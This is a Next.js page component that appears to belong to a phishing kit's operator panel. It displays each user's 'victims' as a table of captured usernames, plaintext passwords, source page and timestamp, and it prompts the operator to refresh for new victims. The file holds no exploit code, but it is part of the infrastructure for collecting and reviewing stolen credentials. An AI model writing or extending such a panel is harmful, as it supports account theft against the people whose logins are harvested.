import { useRouter } from "next/router";
import { useContext } from "react";
import AuthContext from "../component/AuthContext";
import Contain from "../component/Contain";
import Details from "../component/Details";
import Main from "../component/Main";
import withAuth from "../component/WithAuth";

const victims = () => {

    const route = useRouter()
    const {user} = useContext(AuthContext);
    const userA = [user];

 

    const formatDate = (value) => {
        return new Date(value).toLocaleString()
    }

    return (
        <Contain>
            <Details />
            <Main>
        <div>{user? userA.map((item, index) => (
                <table key={index}> <thead><th>Username</th> <th>Password</th> <th>Page</th>  <th>Date</th></thead>
                  <tbody>  {item.victims.map((c, i) => (
                        <tr key={i}>
                            
                            <td>{c.username}</td> 
                            <td>{c.password}</td>
                            <td>{c.Page? c.Page : "empty"}</td>
                            <td>{formatDate(c.created_at)}</td></tr>
                    ))}</tbody>
                    </table>
            )): <p>You have no victims</p>
                    }</div>
                    <p>Refresh this page to check for new victims</p>
                    </Main>
                    </Contain>
    )
}

export default withAuth(victims)

// export async function getServerSideProps(context) {
//     const res = await fetch("")
//     return {
//         props: {},
//     }
// }